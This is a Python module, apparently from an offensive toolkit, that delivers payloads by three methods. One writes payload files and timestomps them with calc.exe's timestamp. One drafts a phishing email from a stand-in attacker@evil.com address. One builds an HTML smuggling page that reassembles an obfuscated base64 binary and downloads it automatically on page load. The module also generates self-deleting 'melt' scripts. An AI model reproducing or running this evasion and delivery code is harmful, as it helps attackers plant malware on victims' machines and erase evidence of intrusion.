import os
import html
import base64
import random
import time
import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Delivery:
    """
    Handles the simulation of payload delivery.
    """

    def deliver(self, payload, method, output_path=None, **kwargs):
        """
        Deliver the payload using the specified method.

        Args:
            payload (str): The payload content.
            method (str): Delivery method ('file', 'email', 'web').
            output_path (str): Path to save file (for 'file' and 'web').
        """
        if method == "file":
            self._deliver_file(payload, output_path)
        elif method == "email":
            self._deliver_email(payload, **kwargs)
        elif method == "web":
            self._deliver_web(payload, output_path)
        else:
            raise ValueError(f"Unknown delivery method: {method}")

    def melt(self, target_os):
        """
        Generates a self-deletion script (Melting).
        Returns the script content as a string.
        """
        if target_os == 'windows':
            # Batch script to delete the payload executable and then itself
            # Expects %1 to be the path of the executable to delete
            return r"""
@echo off
:loop
del /f /q "%1" >nul 2>&1
if exist "%1" goto loop
del /f /q "%~f0" >nul 2>&1
"""
        elif target_os == 'linux':
             # Linux melt is usually handled by the binary unlinking itself, 
             # but we can return a shell command
             return "rm -- \"$0\""
        return None

    def _deliver_file(self, payload, output_path):
        """
        Write payload to a file.
        """
        if not output_path:
            output_path = "payload.txt"
        
        # Ensure directory exists
        dirname = os.path.dirname(output_path)
        if dirname:
            os.makedirs(dirname, exist_ok=True)

        mode = "w"
        if isinstance(payload, bytes):
            mode = "wb"

        with open(output_path, mode) as f:
            f.write(payload)
        print(f"[+] Payload saved to {output_path}")

        # Timestomping (Phase 2)
        self._timestomp(output_path)

    def _timestomp(self, filepath):
        try:
             # Random date within last 1 to 3 months to simulate system file age
             now = time.time()
             delta = random.randint(3600 * 24 * 30, 3600 * 24 * 90)
             past_time = now - delta
             
             # If we are on Windows and can access system files, we might try to copy one.
             # But generally checking os.name is safer.
             if os.name == 'nt' and os.path.exists("C:\\Windows\\System32\\calc.exe"):
                 stat = os.stat("C:\\Windows\\System32\\calc.exe")
                 past_time = stat.st_mtime
                 print("[*] Timestomping: Copied timestamp from calc.exe")

             os.utime(filepath, (past_time, past_time))
             print(f"[*] Timestomping applied: {filepath} set to timestamp {datetime.datetime.fromtimestamp(past_time)}")
        except Exception as e:
             print(f"[-] Timestomping failed: {e}")

    def _deliver_email(self, payload, **kwargs):
        """
        Simulate creating an email draft with the payload.
        Uses email.mime to construct the message.
        """
        print("[*] SIMULATING EMAIL DRAFT")
        
        msg = MIMEMultipart()
        msg['From'] = "attacker@evil.com"
        msg['To'] = "target@victim.com"
        msg['Subject'] = "Important Security Update"
        
        body = "Please review the attached code."
        msg.attach(MIMEText(body, 'plain'))
        
        if isinstance(payload, bytes):
            from email.mime.application import MIMEApplication
            attachment = MIMEApplication(payload)
            filename = "payload.bin"
        else:
            attachment = MIMEText(payload, 'plain')
            filename = "payload.txt"

        attachment.add_header('Content-Disposition', 'attachment', filename=filename)
        msg.attach(attachment)
        
        print(msg.as_string())
        print("[*] Email draft created (simulated).")

    def _deliver_web(self, payload, output_path):
        """
        Generate an HTML file hosting the payload.
        Implements HTML Smuggling for binaries and safe escaping for text.
        """
        if not output_path:
            output_path = "index.html"
        
        # Ensure directory exists
        dirname = os.path.dirname(output_path)
        if dirname:
            os.makedirs(dirname, exist_ok=True)
        
        if isinstance(payload, bytes):
            # FEAT-011: Advanced HTML Smuggling
            encoded_payload = base64.b64encode(payload).decode('utf-8')
            
            # Split into chunks
            chunk_size = 64
            chunks = [encoded_payload[i:i+chunk_size] for i in range(0, len(encoded_payload), chunk_size)]
            
            # Scramble/Reassemble Logic
            # We will put chunks in an array and join them.
            # To add "stack obfuscation", we can variable name randomization.
            var_name = "d" + "".join(random.choices("abcdef", k=4))
            chunks_json = str(chunks)
            
            download_logic = f"""
            var {var_name} = {chunks_json};
            var b64Data = {var_name}.join("");
            
            var byteCharacters = atob(b64Data);
            var byteNumbers = new Array(byteCharacters.length);
            for (var i = 0; i < byteCharacters.length; i++) {{
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }}
            var byteArray = new Uint8Array(byteNumbers);
            var blob = new Blob([byteArray], {{type: "application/octet-stream"}});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = "payload.bin";
            document.body.appendChild(a);
            a.click();
            """
            display_payload = "Binary payload detected. Download started automatically via HTML Smuggling."
        else:
            # FIX-002: HTML Escape
            display_payload = html.escape(payload)
            download_logic = 'console.log("Payload loaded for simulation.");'

        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Payload Delivery</title>
</head>
<body>
    <h1>Security Update</h1>
    <p>Please review the payload below:</p>
    <pre><code>{display_payload}</code></pre>
    <script>
        {download_logic}
    </script>
</body>
</html>
        """
        with open(output_path, "w") as f:
            f.write(html_content)
        print(f"[+] Web delivery page saved to {output_path}")
